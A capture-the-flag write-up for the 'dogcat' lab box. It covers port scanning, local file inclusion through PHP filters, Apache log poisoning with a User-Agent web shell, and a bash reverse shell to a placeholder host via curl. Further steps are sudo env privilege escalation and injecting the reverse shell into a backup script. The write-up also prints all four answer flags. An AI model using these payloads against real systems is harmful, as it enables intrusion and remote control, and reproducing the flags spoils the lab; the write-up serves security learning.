# Recon

In our case we have only the IP address, which is considered a **Grey box pentesting** , and when we deal with situation where we only have the IP address we can't OSINT it we can directly go to passive and active scanning but to gather more information we will start by **active scanning** to figure out **open ports** and if we have an open **Web page / Web App** then we can jump to **passive scanning** in order to collect suffisant information to continue the attack !  
## Active Recon
Usually we start by using **Nmap** (Nmap is a tool used to scan a target using IP address | Domain names to figure out open ports and service versions, it can do more like scanning for potential vulnerabilities through scripts) but I'll start with **Rustscan** because it's much faster and then we can take those ports and scan them deeply using **Nmap** : 

``` shell
rustscan -a <Target-IP>
```

And here is the result : 

![[Pasted image 20260311230612.png]]
As we can see **Rustscan** didn't gave us much info but it gave us the open port fast enough to proceed to **Nmap** : 

``` shell
nmap -A -sC <IP-target> -p 80,22
```

This expression is composed of : 
- nmap : The tool
- -A : enbales Enable OS detection, version detection, script scanning, and traceroute to gather max info
- -sC : ie to "--script=default" launching the scan with default scripts

And there is the result of our scan : 

![[Pasted image 20260311231759.png]]

We can see that we are dealing with a **Linux box** and we have an **Apache** server open @ port 80 we can proceed now shifting our attention to the web server.

Before jumping to looking into the webpage I prefer launching a **dirsearch** to bruteforce for directories to better have a clear attack map (this will help identifying sensitive spots like login, signup, important files, admin panels ...) if we jumped directly to the webpage we'll be distracted by the front end rather than focusing on week spots.

``` shell
dirsearch -u http://<IP-Target>
```

And here is the result : 
![[Pasted image 20260311232635.png]]

we can notice that we have a path leading to **/flag.php** but first let's view the page.

## Passive recon

I visited the web page, and it seems like some sort of galleries where it shows you a picture of a dog or a cat based on your choice (event -> clicking the button trigger). 
![[Pasted image 20260311232926.png]]

when I clicked on "A dog" it shows this : 

![[Pasted image 20260311233103.png]]

One thing attracted my attention is that we have a parameter there **/?view=dog** we will see about it in the vulnerability part, for now let's just keep digging.

Nothing special in that route same thing for "A cat" it shows the cat picture.
let's see that spot **/flag.php** and see if we can get something from it, NOTE that in real life situations we don't have this kind of web pages like "flag.php" it's only noticed around CTFs ! 

I visited flag.php and it shows a blank page , I took some time discovery that flag.php page trying parameter fuzzing and POST method but it seems to not work so we'll stop try for now maybe it's a distraction or could be used later in the exploitation process.

# Vulnerability scanning

what we have until now :
- port 80 and 22 open
- web page with a parameter `/?view=`
- A weird `flag.php`

we can't do much with the part of scanning out dated versions of services, but the sure thing that we have a **LFI vulnerability** (LFI or Local File Inclusion is a vulnerability where we can see other internal files in the same server like for example `/file=../../../../etc/shadow` this can show us the shadow file, it's commonly used by the misuse of the `eval()` function in PHP for our case) I noticed a thing before starting throwing random LFI payloads : 

The parameter doesn't accept a filename but a text value to refer to that file for example we have : 
```
/?view=cat --> show the content of the file : 9.jpg
```
so it's not a direct file based LFI we have to use php filters.

but just to verify let's try a random LFI encoded payload : 
![[Pasted image 20260312000927.png]]

As we can see no result is shown
# Exploitation

Now to the fun part let's abuse PHP filters , I regularly use in those cases `php://filter/convert.base64-encode/resource=FILE` which shows the result in a base64 format let's try it now with the **FILE** replaced with our targeted file --
for more info check : https://github.com/OWASP/www-project-web-security-testing-guide/blob/master/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion.md

I tried using it but seems to not work, after a rabbit hole cognitive suffocation and a pack of cigarettes I tend to a conclusion that maybe there is a restriction to `/shadow/etc` and maybe I should look at that `/flag` page.

I weird observation when we were accessing `/?view=dog` what is dog ? it have to be something semantic maybe a directory let's see with LFI to traverse from `./dog` 

``` shell
/?view=php://filter/convert.base64-encode/resource=./dog/../index
```

![[Pasted image 20260312001937.png]]

finally something ! a **Base64** encoded 
and here is the result : 
![[Pasted image 20260312002125.png]]

---

Interesting we have the code now for the index page let's have a look at it quickly and see what causing the LFI : 

``` php
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
```

AHA! now I see the vulnerability cristal clear, let's go through it one by one : 
- We have `$_GET['view']` which directly get the input from the user
- We have `$ext` basically the extension
- and the big thing that combo of those two above concatenated is directly passed to `include()` which loads files from the machine 
--- 
let's now use that to get the content of `/flag.php` we don't have to include the ".php" to our payload 
`/?view=php://filter/convert.base64-encode/resource=./dog/../flag`
result : `PD9waHAKJGZsYWdfMSA9ICJUSE17VGgxc18xc19OMHRfNF9DYXRkb2dfYWI2N2VkZmF9Igo/Pgo=` 
after decoding it we got the first flag you can find it in the bottom 

now let's do the serious work enough of that flag crap we haven't got yet an **Initial Access** we should look for LFI/RCE to get a (Remote Code Execution) 

I found this page https://hackviser.com/tactics/pentesting/web/lfi-rfi that have some interesting tricks, for RCE we have to go for the user-agent vector : 
as shown the steps are : 
1. Inject `<?php system($_GET['cmd']); ?>` in user-agent
2. and include the access log `view=./dog/../../../var/log/apache2/access.log&cmd=whoami`

In the website it suggests using CURL but I'll use burp suite for now , it didn't work 0...0
After 1hour of burning my inner brain and reviewing the php code I noticed that we have another param `ext=` so the payload should be something like this : `view=./dog/../../../var/log/apache2/access.log&ext=&cmd=whoami`

and here we go we could do the command injection successfully , it's hard to see the result but it's the cursor selected one : 

![[Pasted image 20260312013439.png]]

## Initial access

Now let's prepare the payload, one website that I love to visite when it comes to reverse shell payloads is : https://www.revshells.com/

this will be our payload URL ENCODED: 
``` shell
bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/YOURIP/9001%200%3E%261%27
```

using curl it will be something like : 
``` shell
curl -A "<?php system(\$_GET['cmd']); ?>" http://<TARGET-IP>/

curl "http://10.65.186.164/?view=./dog/../../../../var/log/apache2/access.log&ext=&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/YOURIP/9001%200%3E%261%27"
```

just replace whoami with it and make sure NetCat is listening on port 9001 : `nc -lnvp 9001` 
and as u can see we have now a foothold : 
![[Pasted image 20260312014616.png]]

we can play around now and get horizontal and vertical PrivEsc.

Ah before that We have an issue, two issues actually, the machine DOESN'T HAVE PYTHON and I CAN'T FIND THE SECOND FLAG 0...0

a dirty trick I often use is running this command `find / 2>/dev/null | grep -i flag` , yeah I know it's not practical and had me burning my eyes to find the second flag but what can u do ! 

![[Pasted image 20260312015231.png]]

U can see it right there `/var/www/flag2_QMW7JvaY2LvK.txt` U'll find it down side.

# PrivEsc

Running the famous `sudo -l` i found this : 
![[Pasted image 20260312015559.png]]

I check GTFObins and found this : 

![[Pasted image 20260312015709.png]]

`sudo /usr/bin/env /bin/sh` was enough to get root priv. 

and just like that we are root, Oh! Man that was sooo hard that was the hardest part LOL! 
![[Pasted image 20260312015849.png]]

![[Pasted image 20260312015908.png]]

At this level we only have one last flag to find, aaaand I can't find it.
Checking vital system directories for clues is very important I checked all of them nothing important but `/opt` have an interesting element : 
![[Pasted image 20260312020449.png]]

AH I see I think we are facing a container so the flag maybe in other machine so we have to access it, remember the previous bash payload all what we need to do is inject it in `backup.sh`

![[Pasted image 20260312020810.png]]


and Now we wait for the script to run ...
![[Pasted image 20260312020838.png]]
and we have it !!!
![[Pasted image 20260312020927.png]]

# FINALE
This BOX was exciting a beginner friendly and very inspiring which comes to expected inputs from users 
### Lesson learned
Overall : Don't trust users, exposing params can lead to a penetration
Code : include() shouldn't directly use inputs from users, inputs should be first properly handled
Infrastructure : www-data have access to env ??? 

### Flags

- **flag 1**: THM{Th1s_1s_N0t_4_Catdog_ab67edfa}
- **flag 2**: THM{LF1_t0_RC3_aec3fb}
- **flag 3**: THM{D1ff3r3nt_3nv1ronments_874112}
- **flag 4**: THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}